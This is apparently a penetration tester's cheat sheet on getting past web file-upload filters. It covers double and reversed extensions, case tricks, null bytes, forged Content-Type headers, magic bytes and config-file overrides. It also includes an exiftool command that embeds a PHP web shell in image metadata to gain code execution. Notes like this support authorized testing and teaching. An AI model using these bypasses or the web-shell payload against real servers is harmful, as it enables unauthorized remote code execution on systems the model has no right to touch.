# File Upload exploitation
1. Use double extension (ex: .jpg.php)
2. Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): .php.jpg
3. Mix uppercase and lowercase to bypass extension restriction (ex : .pHp, pHP5, etc...)
4. Null byte (works well against pathinfo())
	- .php%00.gif
	- .php\x00.gif
	- .php%00.png
	- .php\x00.png
	- .php%00.jpg
	- .php\x00.jpg
5. Special characters
	- file.php...... (In Windows when a file is created with dots at the end those will be removed)
	- file.php%20
6. Mime type, change Content-Type :
	- Content-Type : image/gif
	- Content-Type : image/png
	- Content-Type : image/jpeg
![[FileUpload_Content-type_1.png]]
![[FileUpload_COntent-type_2.png]]
7. Magic Bytes (GIF89, GIF89a)
![[FileUpload_Image-Size-Validation-Bypass.png]]
8. Picture Upload with LFI
	- Picture Metadata, hide the payload inside a comment tag in the metadata.
	```bash
	exiftool -Comment='<?php system($_GET['cmd']); ?>' id.php.png
	```
	- It is also possible to hide the PHP code directly inside the image (Put it in the middle of the image)
	![[Pasted image 20210726113936.png]]
	- As we can see, we code execution
	![[Pasted image 20210726114100.png]]
9. Configuration files
	- .htaccess
	- web.config
	- httpd.conf
	- _init_.py